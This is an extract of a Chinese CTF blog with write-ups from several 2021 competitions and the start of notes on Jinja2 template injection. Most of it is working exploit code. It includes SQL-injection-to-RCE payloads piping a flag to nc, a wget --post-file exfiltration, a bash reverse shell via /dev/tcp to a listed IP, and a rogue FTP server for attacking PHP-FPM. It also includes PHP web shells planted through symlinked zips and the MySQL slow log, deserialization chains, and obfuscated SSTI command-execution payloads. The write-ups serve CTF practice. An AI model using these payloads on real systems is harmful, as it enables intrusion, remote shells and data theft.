特性：支持将16进制的值转换为unicode字符，并且可以自定义转义符\n利用这一点可以绕waf，空格用\\t绕过，自定义转义符设为感叹号\n\u0026#39;,\u0026#39;\u0026#39;)\\tON\\tCONFLICT\\t(username)\\tDO\\tUPDATE\\tSET\\tusername=\u0026#39;\u0026#39;\\tRETURNING\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;,\\t1\\tAS\\tU\u0026amp;\u0026#34;!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f\u0026#34;\\tUESCAPE\\t\u0026#39;!\u0026#39;; 这道题的sql注入点在update之后\nINSERT INTO users(username, password) VALUES(\u0026#39;${username}\u0026#39;, \u0026#39;${password}\u0026#39;) ON CONFLICT (username) DO NOTHING 一样的思路，先闭合，在构造正常的js语句\n\u0026quot;\u0026quot;','')/*%s*/returning(1)as\u0026quot;\\\\'/*\u0026quot;,(1)as\u0026quot;\\\\'*/-(a=`child_process`)/*\u0026quot;,(2)as\u0026quot;\\\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*\u0026quot;,(3)as\u0026quot;\\\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//\u0026quot;--\u0026quot;\u0026quot; 还得结合一下前面那个16M的溢出\nstr(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535)) 最后是完整的exp，来自于orange佬\nfrom random import randint import requests # payload = \u0026#34;union\u0026#34; payload = \u0026#34;\u0026#34;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;)/*%s*/returning(1)as\u0026#34;\\\\\u0026#39;/*\u0026#34;,(1)as\u0026#34;\\\\\u0026#39;*/-(a=`child_process`)/*\u0026#34;,(2)as\u0026#34;\\\\\u0026#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*\u0026#34;,(3)as\u0026#34;\\\\\u0026#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//\u0026#34;--\u0026#34;\u0026#34;\u0026#34; % (\u0026#39; \u0026#39;*1024*1024*16) username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535)) data = { \u0026#39;username\u0026#39;: username+payload, \u0026#39;password\u0026#39;: \u0026#39;AAAAAA\u0026#39; } print \u0026#39;ok\u0026#39; r = requests.post(\u0026#39;http://10.188.2.20:12345/reg\u0026#39;, data=data); print r.content 深育这个题不过是把白盒审计换成了黑盒，思路一模一样，就不细嗦了\n参考wp：hitconDockerfile/hitcon-ctf-2017/sql-so-hard/（有这位师傅自制的docker可以自行复现）\nZipZip 页面源码提示：听说压缩包文件也能getshell；压缩包的一个常考点是软链接任意文件读取，不过脑子太木了没想到如何写shell进去，看了wp以后才明白\n上传zip之后回显的路径是/tmp/uploads，显然无法正常访问；这里可以利用软链接将shell写入/var/www/html\n首先创建一个指向/var/www/html/目录的软链接并zip压缩上传\nln -s /var/www/html/ l1 zip -ry l1.zip l1 然后建立一个和软链接名字相同的目录，在里面写shell，之后将这个同名的目录整个zip压缩上传\n# 当前目录/var/www/html/ mkdir l1 \u0026amp;\u0026amp; cd l1 echo \u0026#39;\u0026lt;?php eval($_GET[\u0026#39;wuhu\u0026#39;]);?\u0026gt;\u0026#39; \u0026gt; shell.php cd ../\t# 继续转到/var/www/html/ zip -r l2.zip ./* 即可写入shell\n***WebLog 一打开就会下载一个log文件，但是没什么内容，修改get参数为/?logname=logs/info/info.2021-11-12.log可以得到真正的log，可以看到是java，我爬了\neasysql  long_query_time\n 常用的select、单双引号、括号、分号、set、show、variables、等都没有过滤，语句闭合方式为括号，百名单为数据库记录行数，使用1);{sqlinject}--+可以闭合查询语句+堆叠注入\nshow variables like '%slow_query_log%';\t# 查询慢日志记录是否开启 setglobal slow_query_log=1;\t# 开启慢查询日志 setglobal slow_query_log_file='/var/www/html/helpyou2findflag.php'\t# 设置慢查询日志位置 慢查询，顾名思义时间长的查询记录会被记录下来，我们直接把long_query_time的默认值改掉，然后写入shell\n1);setglobal long_query_time=0.000001;--+ 1);show variables like \u0026#39;long_query_time\u0026#39;l--+ 1);select \u0026#39;\u0026lt;?php $_REQUEST[a]($_REQUEST[b])?\u0026gt;\u0026#39;;--+ 或者用benchmark这样的函数延长执行时间\n1);set GLOBAL slow_query_log_file=\u0026#39;/var/www/html/helpyou2findflag.php\u0026#39;;set GLOBAL slow_query_log=on;set GLOBAL log_queries_not_using_indexes=on;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e from mysql.db where BENCHMARK(5000000000,MD5(0x5476556d));%23 flag位于/home/rainbow/ssh.log\n 比赛能暴露出我太多短板了，问题挺大的\n首先是容易手忙脚乱，第二是他妈的跟个脑瘫一样找到原题都不会变通，第三是就会瞎bb不会学java，第四是缺乏跟队友的沟通\n就差一题就进线下了，这一题就折在我这里，真是我全责，真的很对不起另外的pwn爷和密码爷，太丢人了，我先磕一个，然后给自己两拳\n太他妈可惜了，草\n","date":"2021-11-17T19:11:38+08:00","permalink":"https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/","section":"posts","tags":["wp"],"title":"深育杯2021 Wp"},{"categories":["CTF"],"contents":"CheckIN 是个go的文件，发现了/wget路由可以执行wget命令，接收的参数可以是个数组\n利用wget的参数外带flag\n/wget?argv=1\u0026amp;agrv=--post-file\u0026amp;argv=/flag\u0026amp;agrv=http://101.35.114.107:8426/ eaaasyphp \u0026lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public function __wakeup() { Check::$str1 = true; } } class Hint { public function __wakeup(){ $this-\u0026gt;hint = \u0026#34;no hint\u0026#34;; } public function __destruct(){ if(!$this-\u0026gt;hint){ $this-\u0026gt;hint = \u0026#34;phpinfo\u0026#34;; ($this-\u0026gt;hint)(); } } } class Bunny { public function __toString() { if (Check::$str2) { if(!$this-\u0026gt;data){ $this-\u0026gt;data = $_REQUEST[\u0026#39;data\u0026#39;]; } file_put_contents($this-\u0026gt;filename, $this-\u0026gt;data); } else { throw new Error(\u0026#34;Error\u0026#34;); } } } class Welcome { public function __invoke() { Check::$str2 = true; return \u0026#34;Welcome\u0026#34; . $this-\u0026gt;username; } } class Bypass { public function __destruct() { if (Check::$str1) { ($this-\u0026gt;str4)(); } else { throw new Error(\u0026#34;Error\u0026#34;); } } } if (isset($_GET[\u0026#39;code\u0026#39;])) { unserialize($_GET[\u0026#39;code\u0026#39;]); } else { highlight_file(__FILE__); } 这个题，怎么说 还是我太年轻了 我以为这个就是简单的反序列化+shell写入，然后非常的疑惑为啥本地可以但是远程的shell死活就是不落地，一直在想怎么绕过，这是当时尝试的exp.php\n\u0026lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public $str3; } class Bunny { public $filename; public $data; } class Welcome { public $username; } class Bypass { public $str4; } $check = new Check(); $esle = new Esle(); $bypass = new Bypass(); $welcome = new Welcome(); $bunny = new Bunny(); $esle -\u0026gt; str3 = $bypass; // $bypass -\u0026gt; str4 = \u0026#39;phpinfo\u0026#39;; $bypass -\u0026gt; str4 = $welcome; $welcome -\u0026gt; username = $bunny; $bunny -\u0026gt; filename = \u0026#34;op.php\u0026#34;; $bunny -\u0026gt; data = \u0026#34;xyz\u0026#34; $payload = serialize($esle); echo $payload; 直到赛后才知道这又又又是fpm，需要用ftp打fpm，具体的内容我最近也正在总结，可以参见-\u0026gt;攻击 PHP-FPM 学习笔记（还没全部收尾）\n首先是依据p牛的脚本生成一个urlencode的payload（这里引号有问题的话直接改脚本吧）\n$ python fpm.py 127.0.0.1 \u0026#39;/var/www/html/index.php\u0026#39; -c \u0026#39;\u0026lt;?php exec(\u0026#34;bash -c \\\u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.114.107/8426 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34;);?\u0026gt;\u0026#39; 然后开一个恶意的ftp-server\nimport socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 8001)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 welcome\\n\u0026#39;) #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b\u0026#39;331 Please specify the password.\\n\u0026#39;) #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b\u0026#39;230 Login successful.\\n\u0026#39;) #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b\u0026#39;200 Switching to Binary mode.\\n\u0026#39;) #Size / conn.send(b\u0026#39;550 Could not get the file size.\\n\u0026#39;) #EPSV (1) conn.send(b\u0026#39;150 ok\\n\u0026#39;) #PASV conn.send(b\u0026#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n\u0026#39;) #STOR / (2) conn.send(b\u0026#39;150 Permission denied.\\n\u0026#39;) #QUIT conn.send(b\u0026#39;221 Goodbye.\\n\u0026#39;) conn.close() print(\u0026#34;endd\u0026#34;) 修改之前的反序列化exp\n\u0026lt;?php class Bunny{ public function __construct(){ $this-\u0026gt;data = urldecode(\u0026#39;xxxxxxxxxxxxxxxxxx\u0026#39;); $this-\u0026gt;filename = \u0026#34;ftp://101.35.114.107:8001/aaa\u0026#34;; } } class Welcome{ public function __construct(){ $this-\u0026gt;username = new Bunny(); } } class Bypass{ public function __construct(){ $this-\u0026gt;str4 = new Welcome(); } } class Esle{ } echo urlencode(serialize(array(new Esle(), new Bypass()))); get方式传入，同时vps上开一个ftp-server和一个监听反弹shell的端口，即可拿flag\nMagicMail 原题，ssti套壳，参见-\u0026gt;[DeconstruCTF 2021]Mega Mailer，但是比赛的时候我没出，是我的问题，平时拿现成的payload梭惯了，自己构造的时候就露了怯\npayload的构造参见-\u0026gt;Jinja2 SSTI filter bypasses，使用attr()+hex字符串的方式把基础payload给拼出来\nsender=\u0026amp;receiver=\u0026amp;subject=\u0026amp;message={{()|attr(\u0026quot;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\u0026quot;)|attr(\u0026quot;\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f\u0026quot;)|attr(\u0026quot;\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f\u0026quot;)()|attr(\u0026quot;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026quot;)(180)|attr(\u0026quot;\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\u0026quot;)|attr(\u0026quot;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026quot;)|attr(\u0026quot;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026quot;)(\u0026quot;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\u0026quot;)|attr(\u0026quot;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026quot;)(\u0026quot;\\x65\\x76\\x61\\x6c\u0026quot;)(\u0026quot;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x27\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x27\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\u0026quot;)}} # 原本的样子 ().__class__.__base__.subclasses()[180].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag\u0026#39;).read()\u0026#34;) ","date":"2021-11-16T14:24:03+08:00","permalink":"https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/","section":"posts","tags":["wp"],"title":"陇原战疫CTF Wp"},{"categories":["CTF"],"contents":"给我看看 \u0026lt;?php header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); error_reporting(0); require_once(\u0026#34;flag.php\u0026#34;); class whoami{ public $name; public $your_answer; public $useless; public function __construct(){ $this-\u0026gt;name=\u0026#39;ctfshow第一深情\u0026#39;; $this-\u0026gt;your_answer=\u0026#39;Only you know\u0026#39;; $this-\u0026gt;useless=\u0026#34;I_love_u\u0026#34;; } public function __wakeup(){ global $flag; global $you_never_know; $this-\u0026gt;name=$you_never_know; if($this-\u0026gt;your_answer === $this-\u0026gt;name){ echo $flag; } } } $secret = $_GET[\u0026#39;s\u0026#39;]; if(isset($secret)){ if($secret===\u0026#34;给我看看!\u0026#34;){ extract($_POST); if($secret===\u0026#34;给我看看!\u0026#34;){ die(\u0026#34;\u0026lt;script\u0026gt;window.alert(\u0026#39;这是不能说的秘密\u0026#39;);location.href=\u0026#39;https://www.bilibili.com/video/BV1CW411g7UF\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } unserialize($secret); } }else{ show_source(__FILE__); } 是几个小trick的合集，不难\n extract()可以变量覆盖 $this-\u0026gt;your_answer === $this-\u0026gt;name这样的强比较可以用指针取地址方式绕过  exp\n$test = new whoami(); $test-\u0026gt;your_answer=\u0026amp;$test-\u0026gt;name; echo serialize($test); payload\n/?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B%21 POST: secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22ctfshow%E7%AC%AC%E4%B8%80%E6%B7%B1%E6%83%85%22%3Bs%3A11%3A%22your%5Fanswer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3Bs%3A8%3A%22I%5Flove%5Fu%22%3B%7D 谁是ctf之王？  据说输入框能连起来的\n f12可以看到提示/ssti.html\n然后没啥可说的，原题，一点都没改，直接看之前的博客-\u0026gt;[DigitalOverdoseCTF 2021]madlib\nyysy，看到这个hint我就已经意识到是在考这个题了，果然，没拿上一血可惜了\neasypop \u0026lt;?php highlight_file (__FILE__); error_reporting(0); class action_1{ public $tmp; public $fun = \u0026#39;system\u0026#39;; public function __call($wo,$jia){ call_user_func($this-\u0026gt;fun); } public function __wakeup(){ $this-\u0026gt;fun = \u0026#39;\u0026#39;; die(\u0026#34;阿祖收手吧，外面有套神\u0026#34;); } public function __toString(){ return $this-\u0026gt;tmp-\u0026gt;str; } } class action_2{ public $p; public $tmp; public function getFlag(){ if (isset($_GET[\u0026#39;ctfshow\u0026#39;])) { $this-\u0026gt;tmp = $_GET[\u0026#39;ctfshow\u0026#39;]; } system(\u0026#34;cat /\u0026#34;.$this-\u0026gt;tmp); } public function __call($wo,$jia){ phpinfo(); } public function __wakeup(){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;php版本7.3哦，没有人可以再绕过我了\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } class action_3{ public $str; public $tmp; public $ran; public function __construct($rce){ echo \u0026#34;送给你了\u0026#34;; system($rce); } public function __destruct(){ urlencode($this-\u0026gt;str); } public function __get($jia){ if(preg_match(\u0026#34;/action_2/\u0026#34;,get_class($this-\u0026gt;ran))){ return \u0026#34;啥也没有\u0026#34;; } return $this-\u0026gt;ran-\u0026gt;$jia(); } } class action_4{ public $ctf; public $show; public $jia; public function __destruct(){ $jia = $this-\u0026gt;jia; echo $this-\u0026gt;ran-\u0026gt;$jia; } public function append($ctf,$show){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo new $ctf($show); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;ctf,$this-\u0026gt;show); } } if(isset($_GET[\u0026#39;pop\u0026#39;])){ $pop = $_GET[\u0026#39;pop\u0026#39;]; $output = unserialize($pop); if(preg_match(\u0026#34;/php/\u0026#34;,$output)){ echo \u0026#34;套神黑进这里并给你了一个提示：文件名是f开头的形如fA6_形式的文件\u0026#34;; die(\u0026#34;不可以用伪协议哦\u0026#34;); } } 先直接放payload把，直接用的action_3的rce\n\u0026lt;?php class action_4{ public function __construct(){ $this-\u0026gt;ctf = \u0026#39;action_3\u0026#39;; $this-\u0026gt;show = \u0026#39;cat /fz3_.txt\u0026#39;; } } class action_2{ public function __construct(){ $this-\u0026gt;p = new action_4(); } } class action_1{ public function __construct(){ $this-\u0026gt;tmp = new action_2(); } } class action_3{ public function __construct(){ $this-\u0026gt;str = new action_1(); } } echo serialize(new action_3()); 这个应该比较简单，不用分析都能看明白\n官方wp的预期解长这样-\u0026gt;wp，首先用到了php的内置类DirectoryIterator配合glob伪协议爆破flag文件名\n\u0026lt;?php class action_4 { public function __construct(){ $this-\u0026gt;ctf = \u0026#34;DirectoryIterator\u0026#34;; //GlobIterator  $this-\u0026gt;show =\u0026#34;glob:///f[A-z][0-9]_*\u0026#34;; } } class action_3{ public function __construct(){ $this-\u0026gt;str = new action_1(); } } class action_1{ public function __construct(){ $this-\u0026gt;tmp = new action_2(); } } class action_2{ public function __construct(){ $this-\u0026gt;p = new action_4(); } } echo serialize(new action_3()); 这个确实，但是之后的call_user_func，我只能说 有一说一 我是没复现成功\n这里的死亡wakeup永远会比call先调用，func这里还没到call_user_func就先被清空了，怎么执行？？？\n近在眼前 #!/usr/bin/env python3 from flask import Flask, render_template_string, request from flask_limiter import Limiter from flask_limiter.util import get_remote_address app = Flask(__name__) limiter = Limiter( app, key_func=get_remote_address, default_limits=[\u0026#34;10000 per hour\u0026#34;] ) @limiter.limit(\u0026#34;5/second\u0026#34;, override_defaults=True) @app.route(\u0026#39;/\u0026#39;) def index(): return (\u0026#34;\\x3cpre\\x3e\\x3ccode\\x3e%s\\x3c/code\\x3e\\x3c/pre\\x3e\u0026#34;)%open(__file__).read() @limiter.limit(\u0026#34;5/second\u0026#34;, override_defaults=True) @app.route(\u0026#39;/ssti\u0026#39;) def check(): flag = open(\u0026#34;/app/flag.txt\u0026#34;, \u0026#39;r\u0026#39;).read().strip() if \u0026#34;input\u0026#34; in request.args: query = request.args[\u0026#34;input\u0026#34;] render_template_string(query) return \u0026#34;Thank you for your input.\u0026#34; return \u0026#34;No input found.\u0026#34; app.run(\u0026#39;0.0.0.0\u0026#39;, 80) 属于是char-by-char类型盲注和ssti的结合，限制了1秒5次请求，所以需要我们特意限制一下\nimport requests _url = \u0026#39;http://9a5415f7-b712-423d-b7d4-7f2d61665f95.challenge.ctf.show/ssti?input=\u0026#39; _payload_1 = \u0026#34;{%25 set flag=config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /app/flag.txt\u0026#39;).read()%25}{%25 set sleep=config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;sleep 2.5\u0026#39;)%25}{%25if \u0026#39;\u0026#34; _payload_2 = \u0026#34;\u0026#39; in flag%25}{{sleep.read()}}{%25endif%25}\u0026#34; r = requests.session() charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-_{}\u0026#39; data = \u0026#39;\u0026#39; content = \u0026#39;ctfshow{\u0026#39; for _ in range(40): for i in charset: data = content + i # print(data) url = _url + _payload_1 + data + _payload_2 try: r.get(url=url, timeout=(2.5, 2.5)) except Exception as e: content = data print(content) break print(data) 有小概率会崩，可以多跑一次\n通关大佬 登录，尝试admin: admin，回显 你不能以管理员账号登录，抓包看到jwt，先用jwt.io梭一下\n再用c-jwt-cracker梭一下，爆出来key=12345（不过说实话我这里真没爆出来），再用jwt.io改一下user和exp\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2MzY5NTUwNjR9.jEw2QuCd67ZRC_eAVynhcZTYAyjHSxfrrpkqEF98Uio 看到这种的框，直觉就是sqli, xss, ssti；加上jwt一般flask会用，试一下ssti，果然\n这里的通关人对长度进行了限制，排名需要是数字，时间没有啥必要改，感言不限长度，但是过滤了一票字符（单双引号（无法用hex和拼接），下划线，request，中括号，百分号（无法for语句遍历 如果用chr()还得爆破），算是比较严格的了），可以用|attr()这样的形式来绕过，看了wp之后发现这里还结合了request.args，也就是加一些get参数然后在post的部分进行引用，再充分利用config这个对象（前面那个原题也是充分用了config），payload:\n/edit?a=__init__\u0026amp;b=__globals__\u0026amp;c=__getitem__\u0026amp;d=os\u0026amp;e=popen\u0026amp;f=whoami\u0026amp;g=read POST: name={%25set%20r=request.args%25}\u0026amp;rank=1\u0026amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}\u0026amp;time=2021年11月11日 ","date":"2021-11-16T03:00:57+08:00","permalink":"https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/","section":"posts","tags":["wp"],"title":"CTFshow1121击剑杯 Wp"},{"categories":["CTF"],"contents":"安全攻防\u0026ndash;1  https://security.bilibili.com/sec1024/q/r1.html | 提示\n1024程序员节，大家一起和2233参与解密游戏吧~ happy_1024_2233: e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364 0408abca7deabb96a58f50471171b60e02b1a8dbd32db156\n a1cd5f84-27966146-3776f301-64031bb9\n安全攻防\u0026ndash;2  https://security.bilibili.com/sec1024/q/ | 提示\n某高级前端开发攻城狮更改了一个前端配置项\n 提示中给的是vue的官方文档，并且定位到了productionSourceMap\n来一波f12\n36c7a7b4-cda04af0-8db0368d-b5166480\n安全攻防\u0026ndash;3  https://security.bilibili.com/sec1024/q/eval.zip | 提示\nPHP is the best language for web programming, but what about other languages?\n \u0026lt;?php /* bilibili- ( ゜- ゜)つロ 乾杯~ uat: http://192.168.3.2/uat/eval.php pro: http://security.bilibili.com/sec1024/q/pro/eval.php */ $args = @$_GET[\u0026#39;args\u0026#39;]; if (count($args) \u0026gt;3) { exit(); } for ( $i=0; $i\u0026lt;count($args); $i++ ){ if ( !preg_match(\u0026#39;/^\\w+$/\u0026#39;, $args[$i]) ) { exit(); } } // todo: other filter  $cmd = \u0026#34;/bin/2233 \u0026#34; . implode(\u0026#34; \u0026#34;, $args); exec($cmd, $out); for ($i=0; $i\u0026lt;count($out); $i++){ echo($out[$i]); echo(\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); } ?\u0026gt;可以get方式接收最多3个名为args的参数，对每个参数的值进行正则匹配，最后拼接到$cmd后面被exec执行，用%0a换行+数组[]绕过\npayload\nhttps://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a\u0026amp;args[]=ls https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a\u0026amp;args[]=cat\u0026amp;args[]=passwd 9d3c3014-6c6267e7-086aaee5-1f18452a\n安全攻防\u0026ndash;4  https://security.bilibili.com/sec1024/q/ | 提示\n懂的都懂\n 有个请求api https://security.bilibili.com/sec1024/q/admin/api/v1/log/list，本能的去fuzz一下，结果412了……QAQ\nusername部分可以sqli，过滤了空格和单引号，用注释和16进制绕过\npayload\n\u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,5\u0026#34;, \u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#\u0026#34;, \u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#\u0026#34;, 3d5dd579-0678ef93-18b70cae-cabc5d51\n 难度应该算是偏简单的，就是，emmmmmmmmmm\n算了，我不好说\n","date":"2021-11-14T20:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/","section":"posts","tags":["wp"],"title":"Bilibili 1024安全攻防 Wp"},{"categories":["LTS","环境配置"],"contents":"  本地搭建Visual Regexp   搭建原因大家应该都懂吧，一个是正则可视化实在是很香很必要，其次线下没网的话没有个离线工具就很容易gg，同类工具还有cyberchef等\nVisual Regexp在线地址 | github仓库\n在git clone之后首先肯定是npm install，出现vulnerabilities很正常，直接npm audit fix --force，一次不行就两次\n奇葩的是作者自己的visual-regex包一直是以快捷方式的形式被安装（后来发现是整个项目的package.json编写的问题）\n解决方法：删除快捷方式，单独安装npm i visual-regex，用everything查找到该包具体存在的位置，复制到node_modules目录下\n之后到build目录下node .\\build.js\n报错hightlight.js并没有引入./lib/highlight，查看\\highlight.js\\package.json的exports部分，发现第90行的引用是\u0026quot;.\u0026quot;，将其改为\u0026quot;./lib/highlight\u0026quot;\n再次build提示*\u0026lsquo;NODE_ENV\u0026rsquo; is not recognized as an internal or external command, operable program or batch file.*（此处截图走丢了），解决方法npm install -g win-node-env\n之后node .\\build.js即可成功build，在devlist文件夹下的index.html即可正常使用相关功能\n   无法打开jar包应用   这个应该属于常见问题了，一般原因是java版本不对\n很多人选择设置不同名字的环境变量，比如java8，java11，我的话是只有java11是环境变量，在有些jar需要java8的环境时直接用everything搜索java.exe，复制路径之后xxx\\java.exe -jar xyz.jar这样来运行\n   远程调试Node.js   场景：用vulhub或其它已经打包好的docker环境复现cve需要远程调试\n首先修改对应的docker文件：package.json的\u0026quot;scripts\u0026quot;字段的\u0026quot;start\u0026quot;部分增加--inspect=0.0.0.0:port，指名调试时的监听端口\ndocker-compose.yml中增加监听端口\u0026quot;8000:9229\u0026quot;，之后正常docker-compose up -d\n本地先下载好一样的文件，用vscode生成一个调试文档lauch.json\n需要改的配置有address（远程ip），port（远程监听端口），localRoot（本地路径），remote（远程路径），之后即可打断点调试\n出现unbound breakpoint正常，大概率是你的交互就没执行到打断点的地方，所以没什么反应\n ","date":"2021-11-14T18:10:01+08:00","permalink":"https://amiaaaz.github.io/2021/11/14/maybe-help-someone/","section":"posts","tags":[],"title":"无题"},{"categories":["NOTES\u0026SUMMARY"],"contents":"模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式\nJinja Jinja2是一种面向Python的现代和设计友好的模板语言，以Django的模板为模型，是Flask框架的一部分\nJinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔（这很有利于我们构造恶意的payload），比如这样的模板可以用首字母大写形式显示变量name的值\nHello, {{name|capitalize}} Jinjia2也支持控制语句，比如这是一个常见的for语句的渲染情况\n\u0026lt;ul\u0026gt; {% for comment in comments %} \u0026lt;li\u0026gt;{{comment}}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; 之所以有模板渲染的漏洞是因为在渲染传递进去的参数时模板可以直接访问Python的一些对象及方法，可以构造一个长长的继承链来执行一些操作，比如文件读写\u0026amp;命令执行\n __dict__：保存类实例或对象实例的属性变量键值对字典 __class__：返回一个实例所属的类；python中的新式类（显示继承object对象的类）都有一个属性__class用于获取当前实例对应的类 __mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析（即MRO - Method Resolution Order） __bases__：以元组形式返回一个类直接所继承的类（可以理解为直接父类） __base__：返回一个类直接所继承的类（单个）（相当于__bases__[0]），和__mro__都是用来寻找基类的 __subclasses__：以列表形式返回类的所有存活子类的引用（而非实例）；python中的类都继承自object，只要调用object类对象的__subclasses__()方法就可以获取想要的子类 __init__：类的初始化方法 __globals__：对包含函数全局变量的字典的引用，可以进一步获取file, os等模块 __builtin__\u0026amp;\u0026amp;__builtins__：返回不用导入模块可以直接运行一些函数，例如int()，list()等内建函数，查看的方法是dir(__builtins__)　 在py2中__builtins__模块是解释器自动创建的对于__builtin__模块的引用，并非__buitin__本身（在主模块中时，情况类似我们创建一个变量并对它做一次引用传递，两者是一样的，指向相同；当不是主模块 而是我们创建的一个可以被导入的模块时，__builtins__其实是对__builtin__.__dict__模块的引用） 在py3中__builtin__被命名为builtins 参考：深入理解Python中的__builtin__和__builtins__ | __builtins__ 与 __builtin__（builtins）    构造的原理 一言以蔽之：通过一个长长的调用继承链来将内建的函数或模块揪出来用\nstep1 - 找到基类object 通过字符串、字典、列表、元组和很特殊的request来获取基类object，mro和bases[0]均可（或者是base 一样的效果，不一一列举）\n\u0026#39;\u0026#39;.__class__.__mro__[2]\t# py2 \u0026#39;\u0026#39;.__class__.__mro__[1]\t# py3 {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] step2 - 获得“能用的”子类 ().__class__.__base__.__subclasses__() 会以列表形式返回object基类下的所有子类，我们需要的是其中含有os, file, __builtins__模块的子类；这里给出一个脚本，可以单独寻找特定子类，也可以根据想要的模块找到对应的子类，返回索引位置\n# py2 \u0026amp; py3 subclass = \u0026#34;warnings.WarningMessage\u0026#34; module = \u0026#39;__builtins__\u0026#39; raw = ().__class__.__base__.__subclasses__() for index, value in enumerate(raw): if subclass in str(value): print(\u0026#39;[*] %s- %s\u0026#39; % (str(value), index)) try: if module in value.__init__.__globals__.keys(): print(index, value) except: pass 到这一步可以得到的\n到这一步，我们的payload已经构造好一半了（以下index均指我们需要的subclass的索引位置）\n().__class__.__base__.__subclasses__()[index] step3 - 调用相关函数进行rce py2 - file\u0026amp;os\u0026amp;linecache \u0026lt;type 'file'\u0026gt;是py2的专属，直接可以用read(), write(), 